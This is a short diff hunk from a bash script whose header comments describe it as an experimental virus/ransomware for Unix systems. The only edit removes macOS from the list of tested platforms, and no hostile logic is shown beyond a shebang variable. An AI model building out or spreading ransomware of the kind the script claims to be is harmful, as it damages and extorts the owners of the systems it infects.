@@ -30,7 +30,7 @@
 # This is only an experiment but it can be dangerous.
 # I am not responsible for the damage.
 # This is a virus/ransomware that works on unix systems with bash installed.
-# Tested on Linux (Ubuntu, Debian) and MacOS (OSX)
+# Tested on Linux (Ubuntu, Debian)
 
 SHEBANG="#!/bin/bash"
 
